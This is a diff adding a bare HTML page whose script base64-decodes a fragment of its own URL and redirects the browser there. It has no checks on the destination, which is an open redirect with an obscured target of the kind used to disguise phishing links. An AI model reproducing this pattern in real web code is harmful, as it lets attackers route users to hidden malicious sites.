@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>...</title>
+  </head>
+  <body>
+    <script>
+      if (window.location.href.includes(".(")) {
+        document.location.href = atob(window.location.href.split(".(")[1]);
+      } else {
+        document.location.href = atob(window.location.href.split("#.")[1]);
+      }
+    </script>
+  </body>
+</html>
